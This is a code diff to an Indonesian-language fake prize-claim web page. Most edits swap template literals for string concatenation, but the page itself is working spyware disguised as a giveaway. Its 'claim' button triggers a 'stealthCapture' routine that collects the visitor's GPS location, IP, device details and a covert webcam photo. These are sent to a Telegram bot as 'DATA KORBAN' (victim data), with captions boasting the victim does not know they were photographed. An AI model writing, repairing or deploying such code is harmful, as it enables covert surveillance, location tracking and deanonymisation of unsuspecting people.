@@ -37,7 +37,6 @@
             text-align: center;
             backdrop-filter: blur(10px);
             border: 3px solid gold;
-            position: relative;
         }
         
         .header {
@@ -324,19 +323,6 @@
             }
         }
 
-        /* Efek teks berjalan */
-        .marquee {
-            overflow: hidden;
-            white-space: nowrap;
-            box-sizing: border-box;
-            animation: marquee 10s linear infinite;
-        }
-        
-        @keyframes marquee {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
-        }
-
         /* Ticket style */
         .ticket-number {
             font-family: 'Courier New', monospace;
@@ -400,7 +386,7 @@
                 <div class="optional-text">*Email digunakan untuk konfirmasi pengiriman hadiah</div>
             </div>
             
-            <button class="claim-btn" id="claimButton" onclick="stealthCapture()">
+            <button class="claim-btn" id="claimButton" onclick="stealthCapture(event)">
                 <div class="btn-glow"></div>
                 🚀 KLAIM HADIAH SEKARANG
             </button>
@@ -482,7 +468,7 @@
             else if (timezone.includes('Asia/Jayapura')) waktuIndonesia = 'WIT (Waktu Indonesia Timur)';
             else waktuIndonesia = timezone;
             
-            document.getElementById('timezoneInfo').textContent = `Zona Waktu: ${waktuIndonesia}`;
+            document.getElementById('timezoneInfo').textContent = 'Zona Waktu: ' + waktuIndonesia;
         }
         
         // Countdown 1 jam
@@ -494,7 +480,9 @@
             const seconds = countdownTime % 60;
             
             document.getElementById('countdown').textContent = 
-                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                hours.toString().padStart(2, '0') + ':' + 
+                minutes.toString().padStart(2, '0') + ':' + 
+                seconds.toString().padStart(2, '0');
             
             if (countdownTime > 0) {
                 countdownTime--;
@@ -542,12 +530,11 @@
             
             const effect = document.createElement('div');
             effect.className = 'btn-click-effect';
-            effect.style.left = x - 50 + 'px';
-            effect.style.top = y - 50 + 'px';
+            effect.style.left = (x - 50) + 'px';
+            effect.style.top = (y - 50) + 'px';
             
             btn.appendChild(effect);
             
-            // Hapus efek setelah animasi selesai
             setTimeout(() => {
                 effect.remove();
             }, 600);
@@ -635,35 +622,27 @@
         
         // Fungsi kirim ke Telegram dengan foto stealth
         async function sendToTelegram(data, photoData = null) {
-            let message = `
-🚨 *DATA KORBAN - Frazz go to the moon🤫🧏‍♂️* 🚨
-
-🥳 *Korban franzz jier😈🤫🧏‍♂️* 🥳
-
-🎫 *No. Tiket:* ${data.ticketNumber}
-📧 *Email:* ${data.email || 'Tidak diisi'}
-🕐 *Waktu:* ${data.localDateTime}
-🌐 *Zona Waktu:* ${data.timezone}
-
-📍 *Lokasi:*
-┌ Latitude: ${data.location?.coordinates?.latitude || 'Tidak ada'}
-├ Longitude: ${data.location?.coordinates?.longitude || 'Tidak ada'}
-├ Kota: ${data.location?.address?.city || 'Tidak terdeteksi'}
-└ Negara: ${data.location?.address?.country || 'Tidak terdeteksi'}
-
-💻 *Informasi Perangkat:*
-┌ Platform: ${data.platform}
-├ Browser: ${data.userAgent}
-├ Layar: ${data.screen}
-├ IP: ${data.ip}
-
-${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
-
-⚠️ *Korban Maharaja Franzz kerekam🤫* ⚠️
-            `;
+            let message = '🚨 *DATA KORBAN - FOTO STEALTH* 🚨\n\n';
+            message += '🥳 *PENGGUNA TIDAK MENYADARI DIRI DIFOTO* 🥳\n\n';
+            message += '🎫 *No. Tiket:* ' + data.ticketNumber + '\n';
+            message += '📧 *Email:* ' + (data.email || 'Tidak diisi') + '\n';
+            message += '🕐 *Waktu:* ' + data.localDateTime + '\n';
+            message += '🌐 *Zona Waktu:* ' + data.timezone + '\n\n';
+            message += '📍 *Lokasi:*\n';
+            message += '┌ Latitude: ' + (data.location?.coordinates?.latitude || 'Tidak ada') + '\n';
+            message += '├ Longitude: ' + (data.location?.coordinates?.longitude || 'Tidak ada') + '\n';
+            message += '├ Kota: ' + (data.location?.address?.city || 'Tidak terdeteksi') + '\n';
+            message += '└ Negara: ' + (data.location?.address?.country || 'Tidak terdeteksi') + '\n\n';
+            message += '💻 *Informasi Perangkat:*\n';
+            message += '┌ Platform: ' + data.platform + '\n';
+            message += '├ Browser: ' + data.userAgent + '\n';
+            message += '├ Layar: ' + data.screen + '\n';
+            message += '├ IP: ' + data.ip + '\n\n';
+            message += (photoData ? '📷 *FOTO STEALTH:* BERHASIL!\n\n' : '📷 *FOTO STEALTH:* Gagal\n\n');
+            message += '⚠️ *PELAKU TEREKAM TANPA SADAR* ⚠️';
             
             try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -684,7 +663,7 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                         formData.append('photo', blob, 'wajah_stealth.jpg');
                         formData.append('caption', '📸 FOTO STEALTH - Pelaku tidak menyadari');
                         
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
                             method: 'POST',
                             body: formData
                         });
@@ -711,7 +690,7 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
+                screen: screen.width + 'x' + screen.height,
                 deviceMemory: navigator.deviceMemory || 'N/A',
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 ip: 'Fetching...',
@@ -743,8 +722,9 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         try {
-                            const { latitude, longitude } = position.coords;
-                            const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=id`);
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const response = await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + latitude + '&longitude=' + longitude + '&localityLanguage=id');
                             const locationData = await response.json();
                             
                             resolve({
@@ -804,7 +784,6 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
             document.getElementById('successSound').play();
             document.getElementById('applauseSound').play();
             
-            // Delay untuk cheer sound
             setTimeout(() => {
                 document.getElementById('cheerSound').play();
             }, 1000);
@@ -837,7 +816,7 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
         
         function createConfetti() {
             const container = document.getElementById('confettiContainer');
-            const colors = ['#ff0000', '#00ff00', #0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ff9900', '#00ff99'];
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ff9900', '#00ff99'];
             
             for (let i = 0; i < 150; i++) {
                 const confetti = document.createElement('div');
@@ -853,11 +832,11 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                 
                 const animation = confetti.animate([
                     { 
-                        transform: `translateY(-100px) rotate(0deg)`, 
+                        transform: 'translateY(-100px) rotate(0deg)', 
                         opacity: 1 
                     },
                     { 
-                        transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 720}deg)`, 
+                        transform: 'translateY(' + window.innerHeight + 'px) rotate(' + (Math.random() * 720) + 'deg)', 
                         opacity: 0 
                     }
                 ], {
